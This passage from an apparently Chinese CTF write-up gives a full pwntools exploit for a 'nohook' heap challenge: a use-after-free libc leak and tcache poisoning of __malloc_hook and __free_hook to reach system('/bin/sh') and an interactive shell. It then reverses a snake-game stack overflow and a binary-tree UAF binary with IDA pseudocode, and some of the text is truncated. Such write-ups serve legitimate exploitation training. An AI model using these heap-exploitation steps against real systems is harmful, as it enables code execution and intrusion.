-> system。
###  exp
    #utf-8
    from pwn import *
    context.log_level='debug'
    context.terminal = ["/bin/tmux", "sp",'-h']
    sh = process('./nohook')
    #sh = remote('47.104.143.202',25997)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    def add(size):
      sh.recvuntil('exit')
      sh.sendline('1')
      sh.recvuntil('size:')
      sh.sendline(str(size))
    def dele(idx):
      sh.recvuntil('exit')
      sh.sendline('3')
      sh.recvuntil('id:')
      sh.sendline(str(idx))
    def edit(idx,content):
      sh.recvuntil('exit')
      sh.sendline('4')
      sh.recvuntil('id:')
      sh.sendline(str(idx))
      sh.send(content)
    def show(idx):
      sh.recvuntil('exit')
      sh.sendline('2')
      sh.recvuntil('id:')
      sh.sendline(str(idx))
    add(0x420)#0 large bin
    add(0x10)#1
    edit(1,'/bin/sh\x00')
    dele(0) # free to unsorted bin
    show(0) # UAF
    sh.recvuntil('\x7f\x00\x00')
    libcbase = u64(sh.recv(6).ljust(8,b'\x00')) + 0x7f2be7c93000 - 0x7f2be7e7ebe0
    binsh = libcbase + 0x7f7c9aa4c5aa - 0x7f7c9a895000
    print hex(libcbase)
    #gdb.attach(sh)
    add(0x30)#2
    add(0x30)#3
    dele(3)
    dele(2)
    edit(2,p64(libcbase+libc.sym['__malloc_hook']-0x10))
    add(0x30)#4 -2 
    add(0x30)#5
    edit(5,p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))
    add(0x10)#6
    add(0x10)#7
    dele(7)
    dele(6)
    edit(6,p64(libcbase+libc.sym['__malloc_hook']))
    add(0x10)#8-6
    add(0x10)#9 f
    ######### not used
    add(0x10)#10
    add(0x10)#11
    dele(11)
    dele(10)
    edit(10,p64(libcbase+libc.sym['__memalign_hook']))
    add(0x10)#12
    add(0x10)#13
    one=[0xe6c7e,0xe6c81,0xe6c84]
    edit(13,p64(libcbase+one[0])+p64(0x21))
    ########### not used
    add(0x10)#14
    add(0x10)#15
    dele(15)
    dele(14)
    edit(14,p64(libcbase+libc.sym['system']))
    add(0x10)
    #gdb.attach(sh)
    dele(9) # free_hook -> system
    gdb.attach(sh)
    add(str(binsh-1))
    log.success(hex(libcbase))
    sh.interactive()
## PWN -> tanchishe (栈溢出)
###  题目分析
程序开了NX，环境2.31，no pie，no
canary，程序函数比较多，是一个贪吃蛇小游戏，找程序漏洞点不好找，可以换个思路，如果是栈的漏洞，栈溢出很常见，那么造成栈溢出的只能是用户输入，那么程序中用户输入的点就一处，就是在结束游戏的时候让输入用户名，所以ida打开直接找到输入name的地方看看有没有漏洞点：
    __int64 __fastcall sub_401502(unsigned int a1)
    {
      __int64 result; // rax
      char src[212]; // [rsp+10h] [rbp-100h] BYREF
      int v3; // [rsp+E4h] [rbp-2Ch]
      __int64 v4; // [rsp+E8h] [rbp-28h]
      int v5; // [rsp+F4h] [rbp-1Ch]
      __int64 v6; // [rsp+F8h] [rbp-18h]
      int (**v7)(const char *, ...); // [rsp+100h] [rbp-10h]
      int i; // [rsp+10Ch] [rbp-4h]
      v6 = 138464LL;
      i = 0;
      v5 = 0;
      fflush(stdin);
      sub_4014C8();
      sub_401406(10LL, 5LL);
      printf("Your score is in the top five");
      fflush(stdout);
      sub_401406(10LL, 6LL);
      printf("Please enter your name: ");
      fflush(stdout);
      v7 = &printf;
      ((void (__fastcall *)(char *))(&printf + 17308))(src);  
      if ( dest )
        free(dest);
      dest = (char *)malloc(0xC8uLL);
      strcpy(dest, src);   
      result = a1;
      dword_406160 = a1;
      for ( i = 4; i > 0; --i )
      {
        v4 = qword_406120[i];
        v3 = dword_406150[i];
        if ( v3  leaf (binary tree、UAF)
###  题目分析
题目给的附件是程序leaf和libc-2.31.so，程序保护全开，运行程序：
    栖霞山的枫叶红了, 拾起一片枫叶, 写满对你的思念.  
    1. 写下对你的思念.
    2. 交换彼此的思念.
    3. 读一封枫叶的书信.
    4. 扔下这片枫叶.
    5. 让我来切身体会吧.
    6. 重新书写这份思念.
    Your Choice:
是不是看见这个菜单就头疼呢？我也是，😄，看看ida伪代码，程序在Init函数增加了沙箱，禁用59号调用，查看下程序逻辑：
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      node *v3; // rax
      unsigned int v5; // [rsp+Ch] [rbp-4h]
      Init();
      root[0] = malloc(0x30uLL);
      root[1] = malloc(0x30uLL);
      v3 = (node *)root[1];
      v3->val = 0x7FFFFFFF;
      *(_DWORD *)(root[0] + 40LL) = v3->val;
      puts(&byte_21A8);
      Menu();
      v5 = readi();
      if ( v5 f )
      {
        for ( i = 0; i f->illegal[i] )
          {
            a1->f->ch[i] = 0LL;
            a1->f->illegal[i] = 0;